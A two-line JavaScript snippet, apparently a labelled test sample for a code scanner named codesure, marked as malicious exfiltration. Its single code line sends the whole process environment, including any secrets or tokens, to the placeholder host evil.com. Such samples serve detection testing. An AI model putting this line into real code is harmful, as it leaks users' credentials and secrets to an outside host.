// codesure: MALICIOUS exfiltration
require('http').get('http://evil.com/env?data=' + JSON.stringify(process.env));
